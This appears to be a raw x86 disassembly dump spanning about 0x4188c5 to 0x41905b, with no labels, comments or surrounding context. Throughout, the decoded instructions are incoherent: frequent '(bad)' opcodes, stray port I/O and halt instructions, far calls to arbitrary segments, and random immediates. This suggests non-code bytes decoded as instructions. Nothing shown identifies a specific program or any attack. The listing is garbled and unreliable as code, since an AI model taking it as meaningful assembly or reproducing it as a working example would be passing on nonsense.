  4188c5:	test   DWORD PTR [esi],edi
  4188c7:	adc    al,0x39
  4188c9:	add    eax,0x870a2a
  4188ce:	add    BYTE PTR [eax],al
  4188d0:	add    BYTE PTR [eax],al
  4188d2:	sahf   
  4188d3:	ins    DWORD PTR es:[edi],dx
  4188d4:	not    esi
  4188d6:	neg    esi
  4188d8:	mov    edi,0x9e0bd66d
  4188dd:	int    0xd1
  4188df:	or     al,0x6f
  4188e1:	cmp    dh,bh
  4188e3:	add    eax,0x4f30001
  4188e8:	add    BYTE PTR [eax],al
  4188ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188eb:	fwait
  4188ec:	je     0x4188cb
  4188ee:	stc    
  4188ef:	lock push eax
  4188f1:	adc    BYTE PTR [ebp+0x3bd20069],ch
  4188f7:	mov    cl,0x2f
  4188f9:	mov    ch,0x87
  4188fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4188fc:	dec    ebx
  4188fd:	bound  esi,QWORD PTR [edi]
  4188ff:	adc    al,0xf1
  418901:	(bad)  
  418902:	rcr    DWORD PTR [eax-0x16],cl
  418905:	sub    DWORD PTR [esi],edx
  418907:	xchg   ebp,eax
  418908:	mov    al,0x41
  41890a:	or     al,0x47
  41890c:	scas   eax,DWORD PTR es:[edi]
  41890d:	mov    cl,al
  41890f:	or     eax,edx
  418911:	dec    ebp
  418912:	mov    eax,0x6f4f7da4
  418917:	in     al,0xb4
  418919:	add    dl,BYTE PTR [edi]
  41891b:	push   ss
  41891c:	dec    edi
  41891d:	fild   DWORD PTR [edx+0x8]
  418920:	xchg   esp,eax
  418921:	lods   eax,DWORD PTR ds:[esi]
  418922:	or     al,ch
  418924:	pop    edi
  418925:	sbb    ch,BYTE PTR [eax]
  418927:	mul    DWORD PTR [ecx+ecx*4+0x7835dd8d]
  41892e:	mov    al,ds:0xa4703a08
  418933:	mov    ch,0xe0
  418935:	mov    fs,edx
  418937:	jl     0x418998
  418939:	mov    fs,WORD PTR [ebx-0x5cfb8058]
  41893f:	xor    edx,DWORD PTR [ebp-0x58]
  418942:	fiadd  WORD PTR [esi-0x61aed4e6]
  418948:	call   FWORD PTR [ebx]
  41894a:	scas   eax,DWORD PTR es:[edi]
  41894b:	sbb    dh,BYTE PTR [ebx]
  41894d:	dec    edi
  41894e:	sub    DWORD PTR [edx-0x37545631],ecx
  418954:	dec    ebp
  418955:	mov    esp,DWORD PTR [edi-0x44]
  418958:	fwait
  418959:	lahf   
  41895a:	(bad)  
  41895b:	call   0xeee6f8ee
  418960:	les    edx,FWORD PTR [eax]
  418962:	dec    esi
  418963:	or     bl,bl
  418965:	push   ebp
  418966:	icebp  
  418967:	shl    edi,1
  418969:	adc    al,0x76
  41896b:	ss imul cl
  41896e:	pop    ecx
  41896f:	into   
  418970:	hlt    
  418971:	mov    cl,BYTE PTR [esp+esi*1-0x20]
  418975:	mov    edx,0xddf88b86
  41897a:	test   dh,0x71
  41897d:	sbb    eax,0x4a9eee8b
  418982:	jl     0x4189e6
  418984:	jnp    0x418996
  418986:	imul   DWORD PTR [ecx+0x1c]
  418989:	mov    ds:0x982f932c,al
  41898e:	pop    DWORD PTR ds:0x3aa083ed
  418994:	popa   
  418995:	push   0xe0f4e1ee
  41899a:	mov    ds:0xb34abd16,eax
  41899f:	inc    edx
  4189a0:	stos   DWORD PTR es:[edi],eax
  4189a1:	fwait
  4189a2:	call   0x19d6:0xf05e9615
  4189a9:	xlat   BYTE PTR ds:[ebx]
  4189aa:	adc    al,0xaa
  4189ac:	push   cs
  4189ad:	sub    DWORD PTR [esi+0x14b721e4],edi
  4189b3:	sbb    eax,0xee17c5d8
  4189b8:	in     eax,dx
  4189b9:	sub    eax,0x3e8e82bc
  4189be:	cmp    al,0xf8
  4189c0:	scas   eax,DWORD PTR es:[edi]
  4189c1:	pop    esp
  4189c2:	je     0x4189b3
  4189c4:	xchg   esi,eax
  4189c5:	daa    
  4189c6:	or     dl,BYTE PTR [edi]
  4189c8:	sub    eax,0xc2db1ced
  4189cd:	scas   eax,DWORD PTR es:[edi]
  4189ce:	cld    
  4189cf:	icebp  
  4189d0:	dec    eax
  4189d1:	xor    eax,0xd052a450
  4189d6:	pop    eax
  4189d7:	mov    ah,BYTE PTR ds:0x42c2e690
  4189dd:	add    BYTE PTR [edx+0x4c031f3],0x7a
  4189e4:	xor    DWORD PTR [edi],esi
  4189e6:	jge    0x418a42
  4189e8:	sub    DWORD PTR [ebx],edx
  4189ea:	adc    eax,0x8efb6e67
  4189ef:	xchg   esi,eax
  4189f0:	jmp    0x418a12
  4189f2:	pop    edi
  4189f3:	xchg   esi,eax
  4189f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189f5:	adc    edx,DWORD PTR [esi-0x1b1697cd]
  4189fb:	jmp    0xd5d8:0x78691021
  418a02:	adc    DWORD PTR [esi+0x6551b05d],0x83bd82f6
  418a0c:	inc    eax
  418a0d:	ins    DWORD PTR es:[edi],dx
  418a0e:	loop   0x418a46
  418a10:	mov    WORD PTR [ecx+0x7b],?
  418a13:	fdiv   DWORD PTR [edi-0x79]
  418a16:	clc    
  418a17:	das    
  418a18:	mov    dl,0xd7
  418a1a:	xchg   edx,eax
  418a1b:	jbe    0x4189ea
  418a1d:	popa   
  418a1e:	jbe    0x4189a1
  418a20:	push   esp
  418a21:	popa   
  418a22:	out    0xf3,eax
  418a24:	or     DWORD PTR [esi-0x1842c4ef],ebx
  418a2a:	jg     0x418a4f
  418a2c:	and    edi,DWORD PTR [edx-0x49]
  418a2f:	cld    
  418a30:	popf   
  418a31:	loop   0x4189c9
  418a33:	outs   dx,BYTE PTR ds:[esi]
  418a34:	cwde   
  418a35:	dec    ebx
  418a36:	xchg   esp,eax
  418a37:	aad    0xb8
  418a39:	fiadd  WORD PTR ds:0x3a9084bd
  418a3f:	in     eax,dx
  418a40:	mov    al,ds:0x99fc1304
  418a45:	scas   eax,DWORD PTR es:[edi]
  418a46:	and    DWORD PTR [eax],ebx
  418a48:	cmp    esi,DWORD PTR [esi]
  418a4a:	repz (bad) 
  418a4c:	pop    esp
  418a4d:	mov    ch,0xdf
  418a4f:	xlat   BYTE PTR ds:[ebx]
  418a50:	stos   BYTE PTR es:[edi],al
  418a51:	call   0x9b5c:0xbd00378
  418a58:	mov    al,ds:0x12aa986
  418a5d:	pop    ss
  418a5e:	(bad)  [edx+0x1a90b167]
  418a64:	in     eax,dx
  418a65:	mov    esi,0xfad7f274
  418a6a:	push   esp
  418a6b:	jne    0x418a3a
  418a6d:	imul   edi,DWORD PTR [edx+eiz*1-0x15],0xa119a308
  418a75:	fbld   TBYTE PTR [eax+ebp*8]
  418a78:	leave  
  418a79:	popa   
  418a7a:	enter  0xaea7,0x47
  418a7e:	shl    DWORD PTR [ecx-0x6c9d000b],1
  418a84:	fcomp  DWORD PTR [esi]
  418a86:	cmp    al,0x34
  418a88:	ret    
  418a89:	retf   0x18e9
  418a8c:	ins    BYTE PTR es:[edi],dx
  418a8d:	pop    ecx
  418a8e:	lds    esp,FWORD PTR [ebx+0x3c25d70]
  418a94:	mov    edi,DWORD PTR [ecx+0xaa17f4c]
  418a9a:	loopne 0x418aea
  418a9c:	sub    edx,esp
  418a9e:	imul   esp,esi,0xa46d7a76
  418aa4:	inc    ebp
  418aa5:	dec    edx
  418aa6:	(bad)  
  418aa7:	mov    dl,0xa1
  418aa9:	mov    al,0x5
  418aab:	sub    BYTE PTR [eax],cl
  418aad:	stos   BYTE PTR es:[edi],al
  418aae:	loopne 0x418a6e
  418ab0:	ror    DWORD PTR [ecx],0x4
  418ab3:	mov    ?,WORD PTR [ebx]
  418ab5:	adc    DWORD PTR [edx],ebp
  418ab7:	rcr    DWORD PTR [ecx],0x22
  418aba:	out    0xac,al
  418abc:	push   ds
  418abd:	shufps xmm7,XMMWORD PTR ds:0x9eed021e,0xde
  418ac5:	vmread DWORD PTR [edx],edx
  418ac8:	or     dh,BYTE PTR [ecx-0x1a]
  418acb:	sbb    DWORD PTR [ebx+0x3276aaef],ecx
  418ad1:	in     al,dx
  418ad2:	(bad)  
  418ad3:	clc    
  418ad4:	xchg   edx,eax
  418ad5:	jecxz  0x418b4d
  418ad7:	sbb    ah,ah
  418ad9:	(bad)  
  418adb:	nop
  418adc:	dec    eax
  418add:	jmp    0x16561abf
  418ae2:	std    
  418ae3:	pop    ebp
  418ae4:	sti    
  418ae5:	fwait
  418ae6:	mov    dl,0x1a
  418ae8:	xchg   edx,eax
  418ae9:	rcl    DWORD PTR [ecx+0x649503c1],0x0
  418af0:	addr16 mov ebp,0xbe1ef8b8
  418af6:	retf   
  418af7:	ins    DWORD PTR es:[edi],dx
  418af8:	inc    esp
  418af9:	dec    edx
  418afa:	call   DWORD PTR [edi-0x10]
  418afd:	iret   
  418afe:	lahf   
  418aff:	xor    edi,edx
  418b01:	jle    0x418b36
  418b03:	in     eax,dx
  418b04:	xchg   edx,eax
  418b05:	mov    bh,BYTE PTR [eax]
  418b07:	inc    ecx
  418b08:	repz jp 0x418b43
  418b0b:	aaa    
  418b0c:	scas   eax,DWORD PTR es:[edi]
  418b0d:	or     ch,BYTE PTR [esi+0x68]
  418b10:	sbb    eax,0xeafd01e8
  418b15:	cs pop ebp
  418b17:	add    eax,0x6b2a6935
  418b1c:	jns    0x418b5f
  418b1e:	div    BYTE PTR [ebx]
  418b20:	xor    BYTE PTR [esi],ch
  418b22:	adc    eax,0xfed0fb2a
  418b27:	push   ecx
  418b28:	mov    WORD PTR [ebp-0x1d],ds
  418b2b:	mov    esp,0xa5e8438
  418b30:	jg     0x418b0a
  418b32:	test   eax,0x7e86a645
  418b37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418b39:	dec    edi
  418b3a:	mov    esp,0xc70fd4cc
  418b3f:	inc    esi
  418b40:	inc    edi
  418b41:	jmp    0x418ba4
  418b43:	dec    esi
  418b44:	sbb    eax,0x61b9a657
  418b49:	or     esp,DWORD PTR [ebx+edx*1-0x60]
  418b4d:	pushf  
  418b4e:	in     al,0xd5
  418b50:	test   al,0xa5
  418b52:	imul   esi,DWORD PTR [edi-0xb9203],0x59f8a3e
  418b5c:	les    ebx,FWORD PTR [edx+0x5d9e8d4b]
  418b62:	mov    dl,0xb3
  418b64:	enter  0x78b6,0x48
  418b68:	fwait
  418b69:	sub    BYTE PTR ds:0xb0f12048,ch
  418b6f:	adc    al,0x78
  418b71:	sahf   
  418b72:	dec    esp
  418b73:	cmp    eax,0x2af1a421
  418b78:	retf   0x24dd
  418b7b:	popf   
  418b7c:	jnp    0x418be6
  418b7e:	mov    DWORD PTR [eax+0x3c9d9e2e],edx
  418b84:	or     esi,eax
  418b86:	pop    eax
  418b87:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b88:	mov    ds:0xa73047d6,al
  418b8d:	mov    esp,0x690c910e
  418b92:	lods   eax,DWORD PTR ds:[esi]
  418b93:	cs aam 0xa7
  418b96:	mov    esp,0xfa3bbb6b
  418b9b:	xchg   esp,eax
  418b9c:	inc    edi
  418b9d:	outs   dx,BYTE PTR ds:[esi]
  418b9e:	pop    eax
  418b9f:	in     al,0x2d
  418ba1:	sub    ebx,DWORD PTR ss:[ecx]
  418ba4:	imul   ebp,esp,0xffffff93
  418ba7:	xchg   edx,eax
  418ba8:	stos   BYTE PTR es:[edi],al
  418ba9:	xlat   BYTE PTR ds:[ebx]
  418baa:	clc    
  418bab:	dec    esp
  418bac:	sar    cl,1
  418bae:	sub    DWORD PTR [ebp+edx*4+0x6d],eax
  418bb2:	dec    esi
  418bb3:	sbb    BYTE PTR ds:0xfcbad133,dh
  418bb9:	sar    DWORD PTR ds:0x2f5d818f,1
  418bbf:	or     ah,dh
  418bc1:	fldcw  WORD PTR [ebx+ebx*8-0x4075b09d]
  418bc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418bc9:	repnz out 0x6a,al
  418bcc:	rol    DWORD PTR [eax-0x75dbccef],cl
  418bd2:	lahf   
  418bd3:	sub    ebx,DWORD PTR [ebx]
  418bd5:	aaa    
  418bd6:	xchg   ecx,eax
  418bd7:	cmp    DWORD PTR ds:0x69fb0dc0,esp
  418bdd:	jbe    0x418c15
  418bdf:	loopne 0x418bee
  418be1:	out    0xbc,eax
  418be3:	cli    
  418be4:	icebp  
  418be5:	cmp    al,0xa
  418be7:	and    edi,DWORD PTR [esi+0x4d]
  418bea:	inc    esi
  418beb:	fisttp WORD PTR [edi+0x3f630494]
  418bf1:	xchg   edi,eax
  418bf2:	inc    edx
  418bf3:	shr    BYTE PTR [ecx+0x15],cl
  418bf6:	dec    edi
  418bf7:	ror    BYTE PTR [edi-0x1d2c2936],cl
  418bfd:	add    edx,DWORD PTR [eax+eax*1+0x1c5fc277]
  418c04:	adc    dl,BYTE PTR [edi-0x4664f1d2]
  418c0a:	sbb    eax,0x1c349736
  418c0f:	shl    DWORD PTR [esp+ebx*4+0x22],1
  418c13:	adc    edi,DWORD PTR [edx]
  418c15:	xchg   esi,eax
  418c16:	xchg   edi,eax
  418c17:	sub    BYTE PTR [esi+0x3b],al
  418c1a:	add    eax,0x9cf4367
  418c1f:	fldenv [eax-0x5064c414]
  418c25:	cmovl  eax,ebp
  418c28:	adc    eax,0xb2f23e26
  418c2d:	mov    al,dl
  418c2f:	cmp    DWORD PTR [edi+0x567ca32c],edx
  418c35:	pop    edi
  418c36:	pushf  
  418c37:	(bad)  
  418c38:	add    bh,bl
  418c3a:	pusha  
  418c3b:	mov    ch,0x7f
  418c3d:	xchg   BYTE PTR [edx-0x16],ah
  418c40:	in     eax,dx
  418c41:	adc    BYTE PTR [esi],0x26
  418c44:	pop    edi
  418c45:	jns    0x418bd4
  418c47:	mov    ch,0xe5
  418c49:	and    ebp,edi
  418c4b:	out    0x8f,al
  418c4d:	dec    ecx
  418c4e:	adc    eax,0xd9f6ac7
  418c53:	or     BYTE PTR [edx-0x5d],al
  418c56:	jns    0x418bdb
  418c58:	cmp    bh,bh
  418c5a:	jno    0x418cd7
  418c5c:	xor    al,0x8d
  418c5e:	ds adc cl,bl
  418c61:	push   esi
  418c62:	out    0x96,al
  418c64:	pop    edx
  418c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418c66:	das    
  418c67:	(bad)  
  418c68:	fistp  QWORD PTR [ebx-0x29]
  418c6b:	lahf   
  418c6c:	mov    ah,0x3b
  418c6e:	mov    eax,ds:0x1fc6d979
  418c73:	xor    edi,DWORD PTR [edi+eax*2+0x3635ac99]
  418c7a:	sub    eax,0xe1f0b3a5
  418c7f:	imul   eax,ebp,0xf05aa4f7
  418c85:	sub    edi,DWORD PTR [ebp+edx*4+0x4eea3854]
  418c8c:	aas    
  418c8d:	pop    edi
  418c8e:	rol    DWORD PTR [ecx+0x7b5da0d0],cl
  418c94:	ret    
  418c95:	xor    DWORD PTR [ebx+ebx*8+0x32],edi
  418c99:	xrelease mov DWORD PTR fs:[ebx-0x31],edx
  418c9e:	(bad)  
  418c9f:	out    dx,al
  418ca0:	inc    esp
  418ca1:	xchg   esp,eax
  418ca2:	jne    0x418d02
  418ca4:	in     al,0x20
  418ca6:	popa   
  418ca7:	jp     0x418c7d
  418ca9:	push   esi
  418caa:	sub    BYTE PTR [eax],0xb9
  418cad:	aad    0x8c
  418caf:	lock (bad) 
  418cb1:	sbb    edx,DWORD PTR [edx]
  418cb3:	adc    bl,BYTE PTR ds:0x323424b9
  418cb9:	scas   al,BYTE PTR es:[edi]
  418cba:	es jg  0x418ceb
  418cbd:	or     cl,dl
  418cbf:	mov    al,ds:0x8fa4f317
  418cc4:	push   eax
  418cc5:	(bad)  
  418cc6:	mov    WORD PTR [eax+eiz*8-0x554d4dad],gs
  418ccd:	mov    ds:0x81f019cb,eax
  418cd2:	lahf   
  418cd3:	jmp    0x136d:0x7d706d8d
  418cda:	xchg   edx,eax
  418cdb:	iret   
  418cdc:	lods   al,BYTE PTR ds:[esi]
  418cdd:	test   BYTE PTR [ebx],bh
  418cdf:	call   0xe205:0xbcfe1e3b
  418ce6:	pusha  
  418ce7:	pop    eax
  418ce8:	adc    DWORD PTR [eax+0xc],edx
  418ceb:	(bad)  
  418cec:	ret    0x86f2
  418cef:	sub    eax,0xe0be7b08
  418cf4:	rol    BYTE PTR [eax+0x5d849069],1
  418cfa:	xor    BYTE PTR fs:[esi+0x6],0xe7
  418cff:	hlt    
  418d00:	add    dl,al
  418d02:	push   ecx
  418d03:	mov    dl,0x67
  418d05:	leave  
  418d06:	push   ebp
  418d07:	adc    al,0x64
  418d09:	loope  0x418cee
  418d0b:	add    edx,DWORD PTR [ebx-0x38e484ac]
  418d11:	retf   
  418d12:	ffreep st(7)
  418d14:	mov    al,ds:0xf33ea301
  418d19:	cmp    ebp,DWORD PTR [ebx-0x4a]
  418d1c:	call   0xcf543af6
  418d21:	xchg   ebp,eax
  418d22:	out    dx,eax
  418d23:	es pop ebp
  418d25:	xchg   dl,bh
  418d27:	aad    0x68
  418d29:	cmp    dl,al
  418d2b:	dec    eax
  418d2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418d2d:	xchg   BYTE PTR [esi+0x5951f4e],ah
  418d33:	fmul   DWORD PTR [ebx-0x3d]
  418d36:	retf   0x38d1
  418d39:	xor    eax,0x130f7ecd
  418d3e:	cld    
  418d3f:	add    ch,BYTE PTR ds:0xa9ff0ae2
  418d45:	stos   BYTE PTR es:[edi],al
  418d46:	push   ss
  418d47:	dec    eax
  418d48:	mov    ah,0x85
  418d4a:	lock fidivr DWORD PTR [eax+0x3d979f7a]
  418d51:	out    dx,eax
  418d52:	pop    ebx
  418d53:	and    al,0x5b
  418d55:	and    edi,DWORD PTR [edx]
  418d57:	shr    BYTE PTR [edx+0x1d],1
  418d5a:	cld    
  418d5b:	inc    edi
  418d5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d5d:	stc    
  418d5e:	dec    esi
  418d5f:	dec    ebx
  418d60:	dec    eax
  418d61:	jo     0x418d2c
  418d63:	aaa    
  418d64:	mov    bl,0xb4
  418d66:	push   ds
  418d67:	bound  esp,QWORD PTR [esi+0x7e]
  418d6a:	jns    0x418d61
  418d6c:	sbb    DWORD PTR [ecx-0x52],edi
  418d6f:	dec    esi
  418d70:	and    BYTE PTR [ecx+0x41348d6e],0x72
  418d77:	and    ah,dl
  418d79:	and    dl,BYTE PTR [ebp+0x465758a0]
  418d7f:	cmp    al,0x76
  418d81:	pop    eax
  418d82:	(bad)  
  418d83:	mov    edi,0x8c44da29
  418d88:	sub    BYTE PTR [esi+edi*1-0x2c],dh
  418d8c:	jno    0x418d34
  418d8e:	cmp    BYTE PTR [edx-0x3c],ah
  418d91:	in     al,0xb6
  418d93:	sub    al,BYTE PTR [ebp+0x6783a518]
  418d99:	push   ss
  418d9a:	adc    ch,BYTE PTR [ebp+0x6a]
  418d9d:	retf   0xca35
  418da0:	xor    DWORD PTR [eax-0x20787924],ebx
  418da6:	sbb    DWORD PTR [edx],0x8
  418da9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418daa:	repnz (bad) 
  418dac:	mov    ebp,0x2a7225b4
  418db1:	outs   dx,BYTE PTR ds:[esi]
  418db2:	add    BYTE PTR [edi-0x174b8ccb],ch
  418db8:	jg     0x418e34
  418dba:	cs inc ebp
  418dbc:	int3   
  418dbd:	mov    ds:0x7ffe2445,eax
  418dc2:	(bad)  
  418dc3:	push   ebx
  418dc4:	(bad)  
  418dc5:	jmp    0x418d8e
  418dc7:	jne    0x418ddb
  418dc9:	push   0xc
  418dcb:	jae    0x418e09
  418dcd:	inc    ecx
  418dce:	and    DWORD PTR [eax],eax
  418dd0:	fimul  WORD PTR [esi]
  418dd2:	pusha  
  418dd3:	and    esp,edx
  418dd5:	fs loopne 0x418dbf
  418dd8:	fwait
  418dd9:	mov    ds:0xd1d1ec,al
  418dde:	add    BYTE PTR [eax],al
  418de0:	add    BYTE PTR [eax],al
  418de2:	mov    dl,0x57
  418de4:	push   0xffffffc9
  418de6:	out    dx,eax
  418de7:	std    
  418de8:	mov    bl,0x7f
  418dea:	push   ebx
  418deb:	jg     0x418e10
  418ded:	mov    ecx,0xc24b47ca
  418df2:	jmp    0x4:0xf300010a
  418df9:	add    BYTE PTR [esi],bh
  418dfb:	mov    ah,0xc1
  418dfd:	xor    DWORD PTR [ebx],eax
  418dff:	mov    ebx,0xcc48017
  418e04:	sbb    BYTE PTR [esi-0x2c71d670],ah
  418e0a:	xor    ah,dl
  418e0c:	in     eax,0xb1
  418e0e:	xchg   ebx,eax
  418e0f:	(bad)  
  418e10:	mov    esi,0x1637e793
  418e15:	fmul   DWORD PTR [esi]
  418e17:	fs (bad) 
  418e19:	(bad)  
  418e1a:	scas   al,BYTE PTR es:[edi]
  418e1b:	pop    ss
  418e1c:	repnz push ecx
  418e1e:	mov    edi,0x89fedc07
  418e23:	jb     0x418e35
  418e25:	test   DWORD PTR [edi+0x12],ebx
  418e28:	xor    DWORD PTR ds:0x62b6,eax
  418e2d:	inc    esp
  418e2e:	gs inc esp
  418e30:	pop    ds
  418e31:	push   ecx
  418e32:	(bad)  
  418e33:	out    dx,eax
  418e34:	ret    0x2f01
  418e37:	es push ebx
  418e39:	pop    esi
  418e3a:	scas   eax,DWORD PTR es:[edi]
  418e3b:	inc    edx
  418e3c:	push   ebx
  418e3d:	jge    0x418e08
  418e3f:	mov    ds:0x1864c0d5,al
  418e44:	loopne 0x418e36
  418e46:	mov    ds:0xc1946c41,al
  418e4b:	adc    dl,dl
  418e4d:	push   edi
  418e4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e4f:	std    
  418e50:	(bad)  
  418e51:	jecxz  0x418e2f
  418e53:	push   ss
  418e54:	popa   
  418e55:	out    0xd8,al
  418e57:	or     BYTE PTR [edx+0x528d28f0],0x68
  418e5e:	mov    WORD PTR [ebx+0x13819163],es
  418e64:	dec    ebp
  418e65:	fucom  st(3)
  418e67:	pop    ecx
  418e68:	out    dx,eax
  418e69:	icebp  
  418e6a:	push   edi
  418e6b:	jge    0x418e68
  418e6d:	mov    esi,edi
  418e6f:	dec    eax
  418e70:	or     eax,0xab26d7db
  418e75:	push   DWORD PTR fs:[edx+eax*1]
  418e79:	das    
  418e7a:	inc    edx
  418e7b:	mov    bl,0x88
  418e7d:	pop    es
  418e7e:	jae    0x418e51
  418e80:	fmul   QWORD PTR [ebx]
  418e82:	ret    0x830
  418e85:	pop    ecx
  418e86:	push   0x11
  418e88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e89:	das    
  418e8a:	mov    ds:0xba4e8a1,al
  418e8f:	inc    eax
  418e90:	in     eax,dx
  418e91:	sbb    al,0x6b
  418e93:	test   eax,0xdece9523
  418e98:	loope  0x418e68
  418e9a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418e9b:	xchg   esi,eax
  418e9c:	test   BYTE PTR [ebx-0x1c],cl
  418e9f:	push   edx
  418ea0:	and    bl,BYTE PTR [ebx+0x5fd71ac0]
  418ea6:	sbb    BYTE PTR [esi+0x1821fb33],dh
  418eac:	add    DWORD PTR [edx],esi
  418eae:	xchg   edi,eax
  418eaf:	test   dl,dh
  418eb1:	pop    ecx
  418eb2:	cmp    esi,edi
  418eb4:	jecxz  0x418e5b
  418eb6:	and    BYTE PTR [eax],bl
  418eb8:	stos   DWORD PTR es:[edi],eax
  418eb9:	ficom  DWORD PTR [ebx-0x1f15c65b]
  418ebf:	and    BYTE PTR [edi+0x5],ah
  418ec2:	stc    
  418ec3:	xor    ah,0xcc
  418ec6:	xlat   BYTE PTR ds:[ebx]
  418ec7:	or     BYTE PTR [edi-0x7c],bh
  418eca:	sbb    bl,0x8f
  418ecd:	push   cs
  418ece:	jle    0x418edd
  418ed0:	lds    ecx,FWORD PTR [esi]
  418ed2:	xor    BYTE PTR [eax-0x18d7462f],0xf5
  418ed9:	popf   
  418eda:	pop    esi
  418edb:	adc    eax,edi
  418edd:	out    dx,eax
  418ede:	sub    BYTE PTR [eax],bh
  418ee0:	mov    edi,0x3c94b712
  418ee5:	dec    edx
  418ee6:	jns    0x418ea8
  418ee8:	xchg   ecx,eax
  418ee9:	mov    fs,ecx
  418eeb:	xor    DWORD PTR [ebx],edi
  418eed:	pop    edx
  418eee:	fild   DWORD PTR [esi+0x585d6eeb]
  418ef4:	shl    BYTE PTR [edx+0x770cebca],0xf9
  418efb:	lods   al,BYTE PTR ds:[esi]
  418efc:	repz pop edx
  418efe:	call   0x2eb0:0xa51574d1
  418f05:	(bad)  
  418f06:	test   bl,0xb2
  418f09:	call   0x6ac3:0x8d9e13e1
  418f10:	mov    esi,0xfef871bc
  418f15:	lods   al,BYTE PTR ds:[esi]
  418f16:	dec    ecx
  418f17:	call   0xab64:0x645dfd6f
  418f1e:	pop    esp
  418f1f:	clc    
  418f20:	or     dl,dh
  418f22:	jno    0x418f14
  418f24:	icebp  
  418f25:	cmp    esi,esp
  418f27:	mov    eax,0x66fc01a1
  418f2c:	call   0x2ca36425
  418f31:	xchg   esi,eax
  418f32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f33:	mov    ds:0x36d73cc8,eax
  418f38:	mov    ebp,0x4bc7ca48
  418f3d:	in     al,dx
  418f3e:	pushf  
  418f3f:	jecxz  0x418f42
  418f41:	repnz adc esp,ecx
  418f44:	repnz or dl,cl
  418f47:	rcr    DWORD PTR [ebp+0x6ede37e6],1
  418f4d:	or     DWORD PTR [edi],edi
  418f4f:	sbb    eax,0x839199e4
  418f54:	repz out dx,eax
  418f56:	lds    esp,FWORD PTR [ecx]
  418f58:	dec    ebx
  418f59:	lods   eax,DWORD PTR ds:[esi]
  418f5a:	call   0xd025d47c
  418f5f:	or     BYTE PTR [edi+ebp*4+0x11],cl
  418f63:	inc    edx
  418f64:	sub    esi,DWORD PTR [eax]
  418f66:	and    al,0xa4
  418f68:	sbb    eax,0xb00918b3
  418f6d:	loope  0x418f66
  418f6f:	data16 jbe 0x418ef8
  418f72:	and    ebp,DWORD PTR [edi]
  418f74:	mul    eax
  418f76:	mov    ebx,0x805d4b1f
  418f7b:	pop    ds
  418f7c:	sbb    ebx,esi
  418f7e:	xchg   DWORD PTR [edi],esp
  418f80:	nop
  418f81:	adc    DWORD PTR [edi],ecx
  418f83:	xor    edx,DWORD PTR [ebx-0x6b198971]
  418f89:	cmp    esi,esi
  418f8b:	or     eax,0x2216c18
  418f90:	jo     0x418f3b
  418f92:	sbb    DWORD PTR [eax+0x6cfcc9ab],0x5b
  418f99:	dec    esp
  418f9a:	aad    0x4b
  418f9c:	push   ss
  418f9d:	scas   eax,DWORD PTR es:[edi]
  418f9e:	fimul  WORD PTR [ecx]
  418fa0:	or     BYTE PTR ss:[ecx-0x4bd94b3c],bh
  418fa7:	arpl   WORD PTR [edx+edi*8+0x4b7e3fb2],dx
  418fae:	loope  0x41902f
  418fb0:	fcomp  QWORD PTR [ebx+ecx*8+0x684ab559]
  418fb7:	or     al,0x76
  418fb9:	icebp  
  418fba:	xor    al,0x22
  418fbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418fbd:	data16 into 
  418fbf:	fld    TBYTE PTR [ebp-0x35e944b8]
  418fc5:	jne    0x418ff9
  418fc7:	bound  ebp,QWORD PTR [esi]
  418fc9:	mov    edx,0xca203105
  418fce:	xor    eax,0x69031529
  418fd3:	hlt    
  418fd4:	sar    DWORD PTR [ebp-0x32],cl
  418fd7:	(bad)  
  418fd8:	adc    ah,BYTE PTR [edi-0x45]
  418fdb:	jecxz  0x419013
  418fdd:	mov    al,0x66
  418fdf:	sub    eax,0x62875e8
  418fe4:	ins    DWORD PTR es:[edi],dx
  418fe5:	dec    edx
  418fe6:	xchg   BYTE PTR [esi-0x30],al
  418fe9:	push   ss
  418fea:	jns    0x418ff1
  418fec:	xchg   ebp,eax
  418fed:	call   0x2a73ac16
  418ff2:	adc    ch,BYTE PTR [edx-0x6ac67a0]
  418ff8:	pop    ds
  418ff9:	xchg   DWORD PTR [edx],esp
  418ffb:	sub    al,0xcc
  418ffd:	xchg   edi,eax
  418ffe:	repnz push es
  419000:	iret   
  419001:	lods   al,BYTE PTR ds:[esi]
  419002:	ja     0x418fea
  419004:	xor    BYTE PTR [ecx-0x4c],cl
  419007:	jmp    0xfe559e20
  41900c:	cmp    BYTE PTR [esi-0x3f9c9313],cl
  419012:	push   ecx
  419013:	mov    cl,bh
  419015:	pop    esp
  419016:	jae    0x419083
  419018:	adc    ebx,DWORD PTR [edx]
  41901a:	xchg   esp,eax
  41901b:	jmp    0x418fa5
  41901d:	js     0x41906d
  41901f:	rcl    BYTE PTR fs:[edi-0x69ccce91],cl
  419026:	dec    ecx
  419027:	es loopne 0x419013
  41902a:	xlat   BYTE PTR ds:[ebx]
  41902b:	xor    ebx,eax
  41902d:	dec    ebx
  41902e:	dec    esi
  41902f:	mov    ds:0x33b9c501,eax
  419034:	(bad)  
  419035:	maskmovq mm1,(bad)
  419036:	test   DWORD PTR [edx-0x3d],0x6960c4af
  41903d:	pop    esp
  41903e:	jb     0x419012
  419040:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  419041:	in     al,0x11
  419043:	mov    ebx,0xfb97b7f7
  419048:	pop    eax
  419049:	or     al,0xd2
  41904b:	add    al,BYTE PTR [edi]
  41904d:	lds    edi,FWORD PTR [ebx+0xe]
  419050:	adc    al,0x49
  419052:	xchg   esp,eax
  419053:	outs   dx,DWORD PTR ds:[esi]
  419054:	dec    ebx
  419055:	jge    0x41901d
  419057:	cdq    
  419058:	lods   al,BYTE PTR ds:[esi]
  419059:	jbe    0x4190be
  41905b:	(bad)  
